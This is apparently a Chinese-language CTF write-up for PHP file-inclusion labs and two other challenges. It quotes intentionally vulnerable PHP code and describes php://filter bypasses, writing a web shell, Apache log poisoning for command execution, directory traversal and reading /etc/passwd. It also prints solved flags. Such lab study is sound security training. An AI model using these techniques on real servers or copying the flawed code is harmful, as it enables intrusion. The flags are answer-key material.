![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-031829-4ee0b3-image.png)

拿到 flag

------



#### PHPinclude-labs-level8 php协议__php://filter_过滤器&字符串过滤器

`php://filter` - (PHP_Version>=5.0.0)其参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递，从而组成一个过滤链，常用于数据读取，在特殊情况下，利用特性还可以实现代码执行。无依赖，但在过滤链的代码执行中 php://temp 可能需要allow_url_include:On`

**源码**

```php
<?php 
include("get_flag.php");
// 使用 GET传参并再其前面拼接 php://
isset($_GET['wrappers']) ? include("php://".$_GET['wrappers']) : '';
highlight_file(__FILE__);
?>

```

这题没什么好说的,和第6题一样的,但这题要用 `php://filter` 协议并且成功了就是

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-032829-a802b8-image.png)

再解码就可以拿到 flag 了

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-033057-72c890-image.png)

------



#### PHPinclude-labs-level9 php协议__php://filter___转换过滤器

和上题解法一样(ooc:好像上题不应该这么解的)

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-033605-eb6aae-image.png)

解码就行了

```
R2Vlc2VjezcxZDljYWVhLTMzMDEtNDA4Yi1hMmE3LTQ3YmEyMzdkNjliN30K 

Geesec{71d9caea-3301-408b-a2a7-47ba237d69b7}

```

------



#### PHPinclude-labs-level10 文件系统函数简介 & 文件系统函数_file_get_contents()

PHP 带有很多内置 URL 风格的封装协议( `如 file 协议、data 协议、php 协议等`)，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。

**源码**

```php
 <?php 
include("get_flag.php");
function hello_ctf($file){
    $file = file_get_contents($file);
    if(preg_match("/flag/", $file)){
        die("You CANNOT See The Secret Message!");
    }else{
        var_dump($file);
    }
}

isset($_GET['file']) ? hello_ctf($_GET['file']) : '';
highlight_file(__FILE__);
?>

```

> 这里如果直接传 `?file=/flag`，`file_get_contents()` 会成功读取到`flag{xxx}`，但紧接着 `preg_match` 发现内容里包含 `flag` 字符串，就会直接执行 `die()` 中断程序

所以这里我还是采用 像上面的方法进行绕过

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-034914-860f7c-image.png)

解码:

```
Geesec{66a57e94-4a4b-43f5-8500-d067557b5f2f}

```

------

#### PHPinclude-labs-level11__文件系统函数_file_put_contents()

**file_put_contents** 是 PHP 中用于将字符串写入文件的函数。如果文件不存在，它会创建一个新文件，如果文件已存在，它会覆盖文件内容，除非设置了 FILE_APPEND 标志

**页面源码**

```php
function hello_ctf($filename,$data){
    // 对传入函数的参数 $data值进行过滤
    if(preg_match("/flag|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $data)){
        die("WAF!");
    }
    // 将函数参数传入 file_put_contents()进行
    file_put_contents($filename,$data);
}
// GET请求传参 filename --> 写入文件名; POST请求体 data值(被WAF拦截) --> 写入文件内容
isset($_GET['filename'])&&isset($_POST['data']) ? hello_ctf($_GET['filename'],$_POST['data']) : '';


```

因为写入文件的 data值被拦截且写入后只能通过 输出 $flag 来获取 flag,所以这个行不通

我这里是用了我新建一个文件写入 Payload,然后通过访问这个文件读取 flag

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-040219-814b5e-image.png)

访问shell1.php文件

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-040247-962151-image.png)

得到flag

------

#### 小虎鲸的文档库

打开靶场,提示找靶场和其官网的不同

找了发现靶场中有这部分内容

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-154313-cc47b4-image.png)

,**进入文档库** 是一个超链接,点击进去是这样一个页面,还发现点击不同地文档 URL 上面的 file的值会变

![1793346302719](C:\Users\dashi\AppData\Roaming\Typora\typora-user-images\1793346302719.png)





这里尝试了一下读取 `/flag` 和 `/etc/passwd` 均返回这样的回显

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-154702-f8d03f-image.png)

没有结果,后面也尝试了伪协议和目录遍历等都没有结果,到这里我就没什么思路了,然后去看了别人的wp:  [简易wp | CTF+](https://www.ctfplus.cn/2803/discussion-detail)

说是使用日志投毒,往file参数里写入 : `/var/log/apache2/access.log`, 然后再把 php 代码加到日志里，就可以通过带 get 参数访问日志文件执行任意命令。

**即:**

日志投毒后查看日志

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-155448-57b2e0-image.png)



把 php 代码加到日志里，然后我可以通过带 get 参数访问日志文件执行任意命令。

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-155633-ba89e8-image.png)

访问后，再输入要查询的命令



![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-155835-ee5db3-image.png)

就可以获得 flag



------

#### **05 第五章 打上门来！**

打开靶场:

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-151355-e25627-image.png)

都点进去看了一下,第一个文件中有破解信息

![1793344512313](C:\Users\dashi\AppData\Roaming\Typora\typora-user-images\1793344512313.png)

但这个试了没有成功,题目提示里说了: **CTF中有一招在文件目录中穿梭的技法，是什么呢**？就尝试了一下目录遍历,没想到成功了,试了几个,发现输入` ../../`回车里面有 flag 文件

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-152805-efd282-image.png)

读取就可以拿到 flag了

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-152828-12938d-image.png)

